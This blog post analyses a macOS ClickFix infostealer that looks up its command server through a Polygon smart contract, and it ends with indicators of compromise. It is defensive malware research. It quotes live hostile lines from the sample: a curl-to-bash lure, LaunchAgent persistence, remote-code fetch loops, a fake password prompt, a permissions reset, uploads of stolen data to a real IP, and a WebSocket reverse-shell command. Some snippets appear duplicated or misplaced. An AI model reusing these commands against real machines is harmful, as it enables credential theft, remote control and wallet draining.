+++
title = "C2 on the blockchain"
description = "Why am I suddenly running to so much malware online? Is there something that’s changed, really? Am I… vulnerable? 🥺 Anyway, I mistyped an airline that I am flying with, and of course I came across malware. I think big companies should think about this in advance and buy similar n"
date = "2026-06-08T17:46:21Z"
url = "https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/"
author = "P0pcycle"
text = ""
lastupdated = "2026-11-12T00:42:28.148706928Z"
seen = true
+++

Why am I suddenly running to so much malware online? Is there something that’s changed, really? Am I… vulnerable? ![🥺](https://s.w.org/images/core/emoji/17.0.2/72x72/1f97a.png)

Anyway, I mistyped an airline that I am flying with, and of course I came across malware. I think big companies should think about this in advance and buy similar named domains, potential typos and so-on, and redirect to their real website. That’s just my opinion…

Anyway, I came across another clickfix again. Looked a lot cleaner tbh. But jeeeez what a rabbit hole it was…

1. [Stage 1](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#stage-1)
2. [Stage 2](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#stage-2)
   1. [The dropper ](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#the-dropper)
   2. [Smart contracts ](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#smart-contracts)
   3. [Establishing persistence](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#establishing-persistence)
   4. [Building the C2 server URL at runtime](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#building-the-c2-server-url-at-runtime)

3. [Stage 3](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#stage-3)
   1. [One script, two processes](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#one-script-two-processes)
   2. [Fingerprinting and preparations](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#fingerprinting-and-preparations)
   3. [Password theft](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#password-theft)
   4. [Resetting all macbook permissions](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#resetting-all-macbook-permissions)
   5. [Command handlers](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#command-handlers)

4. [C2 Command dispatch](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#c2-command-dispatch)
   1. [Remote Access Trojan via Websocket](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#remote-access-trojan-via-websocket)
   2. [Upload to C2 server](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#upload-to-c2-server)
   3. [Download malicious Ledger application](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#download-malicious-ledger-application)

5. [Reversing the fake Ledger App](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#reversing-the-fake-ledger-app)
   1. [Last phishing of the day](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#last-phishing-of-the-day)

6. [IOCs](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#iocs)
   1. [Flowchart](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#flowchart)
   2. [Notes](https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/#notes)

#### Stage 1 ####

Always starts with the classic phishing technique “run this in your terminal”.

```
bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly[...]" | base64 -d)
```

Which decodes to:

```
curl -s https://novarift.digital/script.sh | bash
```

#### Stage 2 ####

##### The dropper  #####

Decoding the base64, I got the domain containing the initial dropper script. Obvs wasn’t gonna run it so I used an online curl tool and grabbed the result from the cmd, which decoded to:

```
osascript -e "$(echo "ZXB0ICINClNDU[..]" | base64 -d)"
```

Which then further decoded to:

```
do shell script "SCRIPT_PATH=\"$HOME/Library/[id]\";mkdir -p \"$HOME/Library/LaunchAgents\";cat > \"$HOME/Library/LaunchAgents/com.[id].plist\" <Label com.[id] KeepAlive RunAtLoad ProgramArguments /bin/bash -c echo '5kIGlm[...]' | base64 -d | osascriptEND_PLIST"do shell script "launchctl unload ~/Library/LaunchAgents/com.[id].plist 2>/dev/null"do shell script "launchctl load ~/Library/LaunchAgents/com.[id].plist"
```

I decoded the next osascript that gets fetched and found this nicely obfuscated string concat for stage 2:

```
set __NRFsOg1P to {((character id 112) & (character id 111) & "ly" & (ASCII character 103) & (character id 111) & "n" & (character id 46) & "d" & (ASCII character 114) & "pc." & (ASCII character 111) & "r" [..]
```

After deobfuscating, I was looking for the C2 server URL, but I found a bunch of URLs that I didn’t recognize. This is when I discovered they weren’t just classic C2 domains:

```
'polygon.drpc.org''polygon.publicnode.com''polygon-mainnet.gateway.tatum.io''tenderly.rpc.polygon.community'
```

The C2 server URL is on the **Blockchain** ![😂](https://s.w.org/images/core/emoji/17.0.2/72x72/1f602.png)

No C2 domain is hardcoded in the dropper script. Basic static analysis will only find the polygon domains (which is a blockchain RPC endpoint used by lots of apps).

##### Smart contracts  #####

Running your malware campaign from the blockchain is a lot harder to take down. Usually, one would report the domain, get it taken down, and voilà.

Here, we can’t take down *a service* like polygon.drpc.org.

Hackers got creative and decided to host their C2 server on the blockchain, this way, they can write malware that fetches and constructs the URL at runtime, avoiding any hardcoded domains which would render the malware useless once the C2 server gets taken down.

A smart contract is a small program that runs on a blockchain. Unlike a malicious domain or even some github repo, nobody can take it down. There is no registrar to contact, no abuse team to email, no hosting provider to pressure. The Ethereum and Polygon blockchains are decentralised.

Here the attackers deployed a small program on the Polygon blockchain that, when queried with two identifiers (the contract address and the function selector) returns the C2 server URL as a hexadecimal value that the malware decodes at runtime.

It’s like an API call, except the server can’t be shut down.

##### Establishing persistence #####

The stage 2 osascript was added to a LaunchAgents for persistence. Here’s how they’re establishing persistence:

```
cat > \"$HOME/Library/LaunchAgents/com.guqtsajmydvdqbwg.plist\" <<END_PLIST
```

Inside the plist, they store some important keys:

```html
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>  <key>ProgramArguments</key>    <array>        <string>/bin/bash</string>        <string>-c</string>        <string>echo 'c2Vyd[..]' | base64 -d | osascript</string>    </array>
```

`RunAtLoad` causes launchd to start the agent immediately when the user logs in. `KeepAlive` instructs launchd to restart the process automatically if it ever dies.  
`ProgramArguments` decodes a base64 osascript which will run the stage 2.

Also, the user-level path (`~/Library/`) is a deliberate choice over the system-level path (`/Library/LaunchAgents/`). Writing to the user’s home directory requires no elevated privileges. No sudo prompt, no password dialog, nothing that might alert the user.

##### Building the C2 server URL at runtime #####

The malware in this campaign calls the smart contract using a standard JSON-RPC `eth_call`. If we query the blockchain address, we are returned with a value (in hexadecimal):

```shell
curl -s https://polygon.drpc.org \  -X POST \  -H 'Content-Type: application/json' \  --data '{"jsonrpc":"2.0","method":"eth_call",  "params":[{"to":"0xA3a6[..]","data":"0x26[...]"},  "latest"],"id":1}'
```

```json
{    "id": 1,    "jsonrpc": "2.0",    "result": "0x[...]"}
```

That *result* hex value decodes to *hf98x4d.site*, which is, at the time of writing, the C2 server URL.

The malware queries the blockchain purely to retrieve that address, then contacts the real C2 server directly. It is *THIS* C2 server that receives any exfiltrated data.

The smart thing here is that *hf98x4d.site* is a normal domain that can be reported and taken down within hours, but the smart contract that points to it cannot. When the C2 server gets burned, the attacker registers a new domain, updates the contract in a single blockchain transaction, and every infected machine just redirects to the new domain.

After retrieving the C2 server URL from the blockchain, the stage 2 continues and runs another curl command which will fetch and run the stage 3 scripts.

#### Stage 3 ####

Stage 3 is another obfuscated script that, when decoded, tells us more about what kind of malware we are dealing with.

By running the curl command from stage 2, we can grab the next stage:

```shell
curl \  --connect-timeout 5 \  --max-time 20 \  --retry 3 \  --retry-delay 5 \  -X POST https://hf98x4d.site \  -d 'txid=$id&bmodule' \ >> file.txt
```

```shell
cat file.txtproperty _C1KvapV : ((character id 55) & (character id 100)[...]
```

Within the same script, it’s duplicating the commands that it’s running. As in, it’s doing the same thing, but twice, and using different variable names.

##### One script, two processes #####

Despite there being a single LaunchAgent and a single AppleScript file, the duplication technique results in two completely independent background processes running simultaneously on the victim’s machine.

The LaunchAgent spawns one bash process, which executes one AppleScript. But, that script contains two complete copies of the beacon logic written sequentially. Each copy launches its C2 polling loop using `nohup ... &`, detaching it as its own independent background process.

```apl
set var_curl_1 to "curl " & "-X POST " & quoted form of C2_url_1 & " " & "-d " & quoted form of ("txid=" & prop_$id & ( & "smodule")) & " | osascript"do shell script "nohup sh -c " & quoted form of var_curl_1 & " > /dev/null 2>&1 < /dev/null &"set var_curl_2 to "curl " & "-X POST " & quoted form of C2_url_2 & " " & "-d " & quoted form of ("txid=" & prop_$id & ( & "smodule")) & " | osascript"do shell script "nohup sh -c " & quoted form of var_curl_2 & " > /dev/null 2>&1 < /dev/null &"					
```

The two loops then run in parallel, each beaconing to the C2 every 60 seconds, with no awareness of each other.

If a security tool or the victim kills one process, the other continues completely unaffected. This has a direct consequence for remediation as killing the suspicious osascript process is not sufficient. The LaunchAgent plist must be removed first to prevent launchd from restarting everything, and then all associated background processes must be terminated together. Doing it in the wrong order simply results in the surviving process continuing to run, or launchd silently respawning the whole chain moments later.

##### Fingerprinting and preparations #####

The stage 3 script runs four commands to fingerprint the machine:

```apl
on _JjKRNxU()    set __kJ4ayJ2CB to {"whoami",     "id -un", "echo $USER", "logname"}
```

It also collects the hardware UUID using:

```apl
cat file.txtproperty _C1KvapV : ((character id 55) & (character id 100)[...]
```

##### Password theft #####

It tries to steal your user password by tricking you into submitting it via the pop-up dialog that will run. Then, they store it in a hidden .passphrase file:

```apl
set result to display dialog "To run the application you need to change the settings for its operation." & return & "Please enter password for continue:" default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
```

```apl
set var_passphrase to POSIX path of(path to home folder) & ".passphrase"
```

##### Resetting all macbook permissions #####

If this is the first connection to the server, the malware will perform a `tccutil reset All`. This command resets your entire macOS privacy and permissions database, revoking all permissions granted to all apps across your user account, forcing every app (e.g., Camera, Microphone, Accessibility) to prompt you for permission again when they need it.

I am this is just some sort of anti-forensic protection (like preventing monitoring tools from running). For example, if you have a program such as LittleSnitch which monitors network traffic, it requires permissions to do so. By doing a `tccutil reset All`, LittleSnitch might not be able to run and monitor the network traffic anymore.

```apl
on handler_6(uuid, username, _P5IRp7L)    set var_curl___connect_timeout_5 to "curl --connect-timeout 50 --max-time 100 --retry 3 --retry-delay 2 " & "-X POST " & quoted form of prop_2 & " " & "-d " & quoted form of ("uuid=" & uuid & "&username=" & var_5 & "&txid=" & prop_$id & ( & "connect"))    set var_usr_bin_curl__d__check to do shell script var_curl___connect_timeout_5	    if var_usr_bin_curl__d__check is "newconnect" then		set var_txid to POSIX path of (path to home folder) & ".txid"		do shell script "echo " & quoted form of prop_$id & " > " & quoted form of var_txid        do shell script "tccutil reset All"        return true    end if    if var_usr_bin_curl__d__check is "connected" then return true    return falseend handler_6
```

##### Command handlers #####

Once it establishes a connection, it will start requesting which “task” it needs to do, from the C2 server, performing a curl with the associated module :

```apl
if res_task is "runloader" then ... &smoduleif res_task is "runlight" then ... &lmoduleif res_task is "replacer" then ... &ledgerif res_task is "openshell" then ... &shell
```

I grabbed all of the scripts that each command returns and runs on the victim device. This appear to be *more* scripts for stage 4, the actual exfiltration bit.

#### C2 Command dispatch ####

##### Remote Access Trojan via Websocket #####

**Openshell** command dispatch is actually kinda crazy though… At first, I couldn’t get it to return the script, but I then perform the steps correctly: first connect → task → shell. And what the shell script revealed is bonkers.

It downloads a agent binary (MachO in this case, I ran it in an isolated virtual machine) which was a PyInstaller. After decompiling the bytecode, it turns out that the agent binary is installing a remote access trojan onto the victim device, using websockets to communicate with the server.

It gives the attacker a full interactive /bin/zsh shell on the victim’s machine, streamed through a browser terminal over WebSocket.

```shell
./agent --server ws://62.60.226.50:1337/ws/agent --authkey 214981A2B3C4D-[...]
```

<img data-recalc-dims="1" loading="lazy" decoding="async" width="728" height="1024" data-attachment-id="1474" data-permalink="https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/image-140/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?fit=880%2C1238&amp;ssl=1" data-orig-size="880,1238" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?fit=728%2C1024&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?resize=728%2C1024&amp;ssl=1" alt="" class="wp-image-1474" style="aspect-ratio:0.7109454786519269;width:356px;height:auto" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?resize=728%2C1024&amp;ssl=1 728w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?resize=213%2C300&amp;ssl=1 213w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?resize=768%2C1080&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-3.png?w=880&amp;ssl=1 880w" sizes="auto, (max-width: 728px) 100vw, 728px"> <img data-recalc-dims="1" loading="lazy" decoding="async" width="882" height="256" data-attachment-id="1479" data-permalink="https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/image-142/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-5.png?fit=882%2C256&amp;ssl=1" data-orig-size="882,256" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-5.png?fit=882%2C256&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-5.png?resize=882%2C256&amp;ssl=1" alt="" class="wp-image-1479" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-5.png?w=882&amp;ssl=1 882w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-5.png?resize=300%2C87&amp;ssl=1 300w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-5.png?resize=768%2C223&amp;ssl=1 768w" sizes="auto, (max-width: 882px) 100vw, 882px">Creating a file called hacked using the Web UI remote access trojan

The auth-key is specific to each infected victim, meaning that it is generated server-side whenever the stage 3 script first calls the `&connect` handler. Once that returns a `newconnect`, our device is registered and the `&shell` handler can run and generates the auth-key.

By reverse engineering, I managed to get an idea of what the agent is doing without having to run it (my idea was to run wireshark and capture packets).

The agent binary is a macOS reverse shell disguised as a “Terminal Hub agent.” It’s a Python script packaged with PyInstaller (so it carries its own Python runtime and dependencies and needs nothing installed on the victim’s machine). When executed, it silently connects to a WebSocket C2 server at ws://62.60.226.50:1337/ws/agent, authenticating with a hardcoded key. It then sends the victim’s username and hostname to the operator and waits for commands.

When the operator wants a shell, the agent calls pty.fork() which spawns a /bin/zsh process attached to a pseudo-terminal, giving the attacker a fully interactive session in their browser. It forwards shell output to the attacker over WebSocket and writes their keystrokes back to the shell. The agent reconnects automatically if the connection drops, making it persistent across network interruptions.

The dropper script that installs it redirects all output to /dev/null to hide every trace of the download and execution from the victim.

Here’s what it does step-by-step:

1. **Connects** to ws://62.60.226.50:1337/ws/agent and authenticates with the –authkey
2. **Handshake**: sends {“type”: “hello”}, expects {“type”: “hello\_ok”} back
3. **On session\_open**: forks /bin/zsh with TERM=xterm-256color into a PTY
4. **Relays I/O**: PTY output → base64 → {“type”: “output”, “data”: …} → WS server → attacker’s browser
5. **Accepts input/resize/session\_close** messages from the C2 to control the shell
6. **Reconnects** forever if the WebSocket drops

Also, by reading the agent.pyc reconstructed code, we can see that the same IP is used for both the websocket connection and the web UI for the attacker to open in their browser to get the terminal view.

```python
def make_user_url(server_url: str, key: str) -> str:      p = urlparse(server_url)      scheme = 'https' if p.scheme == 'wss' else 'http'      return scheme + '://' + p.netloc + '/connect/' + key
```

This is interesting as I was able to uncover the html and javascript code that is hosted on the web UI and gain more knowledge on how it connects back to the victim machine.

1. The hub server serves back this HTML page. At the same time it sets a cookie in the browser with the key value so it remembers who this session belongs to.
2. xterm.js draws a terminal in the browser, then calls connect() which opens a second WebSocket connection back to the same server:  
   `ws://62.60.226.50:1337/ws/terminal  
   `The browser automatically sends the cookie along with this WebSocket connection, which is how the hub knows which victim’s shell to attach to.
3.  At this point the hub has two open WebSockets:  
   – The agent connected on /ws/agent (from the victim’s machine)  
   – The browser connected on /ws/terminal (from the attacker)

##### Upload to C2 server #####

The **runloader** and **runlight** are both exfiltration scripts, again with another same level of obfuscation as the previous Apple Scripts. Except, this one is very explicit about its intentions ![😂](https://s.w.org/images/core/emoji/17.0.2/72x72/1f602.png)

```apl
handler_1("Essential macOS Stealer", var_tmp_$id & "UserInformation")
```

And for the first time, I think we can associate a name to this? NITRO?

```apl
handler_1("Build: NITRO", var_tmp_$id & "UserInformation")
```

The *runloader* is essentially a victim fingerprint, browser credential theft, wallet extension theft, password manager theft, file grabber, Apple Notes theft (where we *all* keep our passwords ![😉](https://s.w.org/images/core/emoji/17.0.2/72x72/1f609.png) ), etc… and then ZIPs them all up and uploads it to their C2 server:

```apl
set var_curl to "curl -F " & quoted form of "txid=$id" & " -F " & quoted form of ("file=@" & var_tmp_$id) &" http://62.60.226.0/upload.php
```

Turns out, the hosting service for the raw ip (which is also used as an endpoint to upload the stolen data from the victim) is none other than FEMO IT SOLUTIONS LTD, a known hosting operator that has been previously linked to other type of malware and infostealers ([https://decodecybercrime.com/mapping-defhost-an-investigation-into-femo-it-solutions-limited-as214351/](https://decodecybercrime.com/mapping-defhost-an-investigation-into-femo-it-solutions-limited-as214351/)). So, that’s great?

It seems that this is just a fallback server, when the primary URL fails or if the size of the uploaded data exceeds 90MB.

```apl
set statSizeZip to do shell script "stat -f%z " & quoted form of var_tmp_3177338c4d47ccbcaa6	set sizeZip to statSizeZip as integer	set maxSize to 90 * 1024 * 1024	if sizeZip > maxSize then        curl -F file=@stolen.zip http://62.60.226.0/upload.php
```

##### Download malicious Ledger application #####

The **replacer** downloads a malware application (fake version of Ledger.dmg) in your tmp directory and mounts it:

```shell
set var_curl to "curl -F " & quoted form of "txid=$id" & " -F " & quoted form of ("file=@" & var_tmp_$id) &" http://62.60.226.0/upload.php
```

I wonder if the openshell command we couldn’t fetch runs the *Ledger Wallet.App*, or if they except the user to run the app once they want to open their Ledger application.

I, of course, had to reverse engineer this. Here’s the deal.

#### Reversing the fake Ledger App ####

After doing some reverse engineering, I found that there is a PyInstaller bootstrap. It’s possible to detect them thanks to specific set of magic header bytes   
`MEI\014\013\012\013\016`. This header is the start of a CArchive (zlib-compressed payload). By extracting the arm64 archive using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor).

```shell
python3 pyinstxtractor.py ledger_arm64
```

Then, I decompiled the Python Bytecode to get readable disassembly:

```
 python3 -c "
  import dis, marshal

  with open('/tmp/ledger_arm64_extracted/Ledger Wallet.pyc', 'rb') as f:
      f.read(16)          # skip: magic(4) + flags(4) + timestamp(4) + size(4)
      code = marshal.loads(f.read())   # deserialize the code object

  # Recursively extract all string constants
  def find_consts(co, depth=0):
      for c in co.co_consts:
          if isinstance(c, str) and len(c) > 3:
              print('  ' * depth + repr(c))
          if hasattr(c, 'co_consts'):
              find_consts(c, depth+1)

  find_consts(code)

  # Full disassembly of all nested code objects
  def disasm_all(co, name='<top>'):
      print(f'\n====== {name} ======')
      dis.dis(co)
      for c in co.co_consts:
          if hasattr(c, 'co_code'):
              disasm_all(c, getattr(c, 'co_qualname', c.co_name))

  disasm_all(code)
  "
```

What the code does:

* Creates a hidden temp directory under /tmp/\_MEI\<random\>/
* Decompresses and writes the full Python 3.13 runtime + 103 modules to disk
* Dynamically loads libpython via dlopen
* Hands off execution to the Python entry point Ledger Wallet.py

It then resolves to the smart contract the same way the dropper did, retrieving the C2 URL.

Then, the malware assembles the full phishing URL with the *\~/.txid* value (which is thought to be the campaign ID) from the earlier dropper stages:

```
 python3 -c "
  import dis, marshal

  with open('/tmp/ledger_arm64_extracted/Ledger Wallet.pyc', 'rb') as f:
      f.read(16)          # skip: magic(4) + flags(4) + timestamp(4) + size(4)
      code = marshal.loads(f.read())   # deserialize the code object

  # Recursively extract all string constants
  def find_consts(co, depth=0):
      for c in co.co_consts:
          if isinstance(c, str) and len(c) > 3:
              print('  ' * depth + repr(c))
          if hasattr(c, 'co_consts'):
              find_consts(c, depth+1)

  find_consts(code)

  # Full disassembly of all nested code objects
  def disasm_all(co, name='<top>'):
      print(f'\n====== {name} ======')
      dis.dis(co)
      for c in co.co_consts:
          if hasattr(c, 'co_code'):
              disasm_all(c, getattr(c, 'co_qualname', c.co_name))

  disasm_all(code)
  "
```

##### Last phishing of the day #####

The application opens a 1050×750 frameless pywebview window with fake macOS traffic-light buttons (red/yellow/green circles) drawn in HTML/CSS, so the window looks like a native macOS app.

Inside the window is an invisible iframe filling the entire screen, loading the phishing URL from the attacker’s server. The victim sees what appears to be the official Ledger Live interface, likely a “wallet recovery” or “firmware update” flow prompting them to enter their 24-word seed phrase.

Then, the attackers use the seed phrase to import the victim’s wallet to drain all the crypto funds.

In the reconstructed python code, I found a comment /\* Область для перетаскивания окна \*/ which is Russian for *“Area for dragging the window”*.

#### IOCs ####

**Network**

|             Indicator              | Type |               Role                |
|------------------------------------|------|-----------------------------------|
|         `novarift.digital`         |Domain|         ClickFix delivery         |
|`https://novarift.digital/script.sh`| URL  |          Stage 2 dropper          |
|           `hf98x4d.site`           |Domain|             C2 server             |
| `https://hf98x4d.site/upload.php`  | URL  |       Primary exfiltration        |
|  `http://62.60.226.0/upload.php`   | URL  |       Fallback exfiltration       |
|           `62.60.226.0`            |  IP  |Origin server — AS214351, Frankfurt|
|      `http://api.ipify.org/`       | URL  |       Victim IP harvesting        |

**Blockchain**

|                 Indicator                  |      Type       |     Role      |
|--------------------------------------------|-----------------|---------------|
|`0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0`|Polygon contract |C2 URL resolver|
|                `0x2686ecea`                |Function selector|Contract getter|
|             `polygon.drpc.org`             |       RPC       |  Fallback 1   |
|          `polygon.publicnode.com`          |       RPC       |  Fallback 2   |
|     `polygon-mainnet.gateway.tatum.io`     |       RPC       |  Fallback 3   |
|      `tenderly.rpc.polygon.community`      |       RPC       |  Fallback 4   |

**Campaign Identifiers**

|            Indicator             |     Type     |        Role        |
|----------------------------------|--------------|--------------------|
|`7dc957c3cfcbf7bb79ff3b8f0f8288a9`| Campaign ID  |txid in all C2 comms|
|    `Essential macOS Stealer`     |Malware family|  Self-identified   |
|             `NITRO`              |  Build name  |  Self-identified   |

**Host-Based**

|                      Indicator                      |  Type   |          Role          |
|-----------------------------------------------------|---------|------------------------|
| `~/Library/LaunchAgents/com.guqtsajmydvdqbwg.plist` |  File   |      Persistence       |
|                   `~/.passphrase`                   |  File   |Harvested macOS password|
|                      `~/.txid`                      |  File   |  Hardware UUID store   |
| `/tmp/3177338c4d47ccbcaa6fd737973f73011780911129/`  |Directory|        Staging         |
|`/tmp/3177338c4d47ccbcaa6fd737973f73011780911129.zip`|  File   |  Exfiltration archive  |
|                 `/tmp/updstat.txt`                  |  File   |       Upload log       |

**Ledger Replacement Module (`replacer`)**

|                              Indicator                               |    Type    |              Role               |
|----------------------------------------------------------------------|------------|---------------------------------|
|[https://hf98x4d.site/assets/L.dmg](https://hf98x4d.site/assets/L.dmg)|    URL     |  Malicious Ledger DMG download  |
|                  `f6b626bb0dfff464c6b6ac56ab6adecf`                  |    MD5     |Trojanized `Ledger Wallet` binary|
|                         `Ledger Wallet.app`                          |  App name  |  Fake Ledger Live application   |
|                           `Ledger Wallet`                            |Process name| Trojanized binary process name  |

##### Flowchart #####

<img data-recalc-dims="1" loading="lazy" decoding="async" width="875" height="1024" data-attachment-id="1442" data-permalink="https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/image-139/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?fit=1186%2C1388&amp;ssl=1" data-orig-size="1186,1388" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?fit=875%2C1024&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?resize=875%2C1024&amp;ssl=1" alt="" class="wp-image-1442" style="aspect-ratio:0.8544932365772916;width:367px;height:auto" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?resize=875%2C1024&amp;ssl=1 875w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?resize=256%2C300&amp;ssl=1 256w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?resize=768%2C899&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-2.png?w=1186&amp;ssl=1 1186w" sizes="auto, (max-width: 875px) 100vw, 875px">

##### Notes #####

I found this blog from Elastic [https://www.elastic.co/security-labs/phantom-in-the-vault](https://www.elastic.co/security-labs/phantom-in-the-vault). There are some similarities with my sample, however some of the deliveries are different.

Could it be the same threat actor but with different delivery methods?

Also, Shodan revealed interesting information regarding the C2 server *hf98x4d.site*. Lots of open ports and hosted on Cloudflare.

<img data-recalc-dims="1" loading="lazy" decoding="async" width="1024" height="495" data-attachment-id="1384" data-permalink="https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/image-137/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?fit=2870%2C1388&amp;ssl=1" data-orig-size="2870,1388" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?fit=1024%2C495&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=1024%2C495&amp;ssl=1" alt="" class="wp-image-1384" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=1024%2C495&amp;ssl=1 1024w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=300%2C145&amp;ssl=1 300w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=768%2C371&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=1536%2C743&amp;ssl=1 1536w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=2048%2C990&amp;ssl=1 2048w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image.png?resize=1200%2C580&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px">

Also, since I originally got the clickfix from ethiad.com and it was no longer resolving to the clickfix page, my friend advised me to check dnsdumpster.com.

It seems that there were 598 domains generated using a domain generation algorithm:

<img data-recalc-dims="1" height="1024" width="958" decoding="async" data-attachment-id="1433" data-permalink="https://p0pcycle.com/2026/06/08/c2-on-the-blockchain/image-138/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-1-e1780931318321.png?fit=1690%2C707&amp;ssl=1" data-orig-size="1690,707" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-1-e1780931318321.png?fit=1024%2C428&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/06/image-1.png?resize=958%2C1024&amp;ssl=1" alt="" class="wp-image-1433">

You can see that the IP is exactly the same for a whole bunch of them, which means that they have almost 600 unique domains for this campaign.